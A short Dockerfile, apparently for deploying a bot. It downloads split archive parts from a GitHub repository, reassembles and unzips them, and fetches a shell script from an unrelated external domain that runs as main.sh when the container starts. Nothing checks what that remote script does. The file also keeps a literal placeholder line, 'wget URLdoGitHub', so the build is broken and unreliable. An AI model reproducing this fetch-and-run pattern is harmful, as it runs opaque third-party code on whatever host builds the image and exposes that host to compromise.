FROM node:lts-buster
RUN apt-get update && \
apt-get install -y \
ffmpeg \
imagemagick \
webp && \
apt-get upgrade -y && \
rm -rf /var/lib/apt/lists/*
RUN wget https://github.com/Ecimar/Bot-X-para-hopedar/raw/main/aa https://github.com/Ecimar/Bot-X-para-hopedar/raw/main/ab https://github.com/Ecimar/Bot-X-para-hopedar/raw/main/ac https://github.com/Ecimar/Bot-X-para-hopedar/raw/main/ae https://github.com/Ecimar/Bot-X-para-hopedar/raw/main/af https://github.com/Ecimar/Bot-X-para-hopedar/raw/main/ag
RUN wget URLdoGitHub
RUN cat a* > renderbfanarrowx.zip
RUN unzip renderbfanarrowx.zip
RUN rm -rf renderbfanarrowx.zip
RUN wget -O main.sh https://go.bruceds.my.id/EPMS.sh
COPY . .
RUN chmod +x ./main.sh
RUN chmod +x ./start.sh
EXPOSE 5000 3000
CMD ["sh", "-c", "./start.sh & ./main.sh"]
